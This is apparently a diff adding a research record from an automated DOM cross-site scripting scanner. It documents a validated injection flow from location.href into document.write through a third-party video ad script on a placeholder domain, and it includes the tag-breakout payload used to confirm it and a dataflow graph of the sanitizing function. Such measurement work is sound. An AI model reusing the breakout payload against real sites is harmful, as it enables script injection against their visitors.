@@ -1,0 +1,106 @@
+// Finding: 0dc6b3dc-51eb-4bf4-a421-c849136156af
+// Finding.url: https://www.example376.com/automobiles-ctgid150
+// Finding.parentloc: https://www.example376.com/automobiles-ctgid150##'></iframe></style></script></object></embed></textarea><script>taintfoxLog('d7f0e2c669ea4937bc2a7741afe41e58')</script><!--/*
+// Finding.domain: www.example376.com
+// Finding.base_domain: example376.com
+// Finding.source: location.href
+// Finding.sink: document.write
+// Sanitizer.score: 1
+// Sanitizer.name: SekindoClientDetections_URL/this.setInfo
+// Sanitizer.location: https://live.example5.com/live/liveView.php?s=97321&cbuster=2055094117&pubUrl=https://www.example376.com/automobiles-ctgid150%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27d7f0e2c669ea4937bc2a7741afe41e58%27)%3C/script%3E%3C!--/*&x=600&y=410&vp_content=plembed279lquzvmknx&vp_template=2922 - SekindoClientDetections_URL/this.setInfo:621:7
+// Finding.begin: 396
+// Finding.end: 451
+// Finding.original_uuid: 2a33203c-9621-4550-9995-01f2661121d0
+// Finding.TwentyFiveMillionFlowsId: 724966396
+// Finding.script: https://live.example5.com/live/liveView.php?s=97321&cbuster=2055094117&pubUrl=https://www.example376.com/automobiles-ctgid150%23%23%27%3E%3C/iframe%3E%3C/style%3E%3C/script%3E%3C/object%3E%3C/embed%3E%3C/textarea%3E%3Cscript%3EtaintfoxLog(%27d7f0e2c669ea4937bc2a7741afe41e58%27)%3C/script%3E%3C!--/*&x=600&y=410&vp_content=plembed279lquzvmknx&vp_template=2922
+// Finding.line: 914
+// Exploit.uuid: d7f0e2c6-69ea-4937-bc2a-7741afe41e58
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: src
+// Exploit.quote_type: '
+// Exploit.tag: script
+// Exploit.break_out: #'></iframe></style></script></object></embed></textarea><script>
+// Exploit.break_in: </script><!--/*
+// Exploit.payload: #'></iframe></style></script></object></embed></textarea><script>taintfoxLog(1)</script><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 41
+// Exploit.replace_begin_url: 41
+// Exploit.replace_end_url: 41
+// Exploit.replace_begin_param: 271
+// Exploit.replace_end_param: 271
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -2039633763
+// DepGraph.sanitizer_hash: -446360770
+
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="encodeURIComponent"];
+n2 [shape=box, label="Var: x"];
+n3 [shape=ellipse, label="."];
+n4 [shape=box, label="Lit: &pubUrlAuto="];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: https://live.example5.com/live/liveView.php?s=97321&cbuster=205....ontent=plembed279lquzvmknx&vp_template=2922&cbuster=1621065336"];
+n7 [shape=ellipse, label="str_replace_once"];
+n8 [shape=box, label="Lit: SEKXLEN"];
+n9 [shape=box, label="Lit: 600"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="Lit: SEKYLEN"];
+n13 [shape=box, label="Lit: 410"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="str_replace_once"];
+n16 [shape=box, label="Lit: '"];
+n17 [shape=box, label="Lit: %27"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="."];
+n20 [shape=box, label="Lit: &csuuid=609f7e7858715"];
+n21 [shape=ellipse, label="."];
+n22 [shape=box, label="Lit: &videoType=flow&floatWidth=400&floatHeight=225&floatDirection=....loatCloseBtn=1&flowMode=seenboth&flowCloseButtonPosition=right"];
+n23 [shape=box, label="Var: x"];
+n24 [shape=doubleoctagon, label="Return: x"];
+n2 -> n0;
+n1 -> n2;
+n3 -> n4;
+n3 -> n1;
+n5 -> n6;
+n5 -> n3;
+n10 -> n5;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n14 -> n7;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n18 -> n11;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n19 -> n15;
+n19 -> n20;
+n21 -> n19;
+n21 -> n22;
+n23 -> n21;
+n24 -> n23;
+}
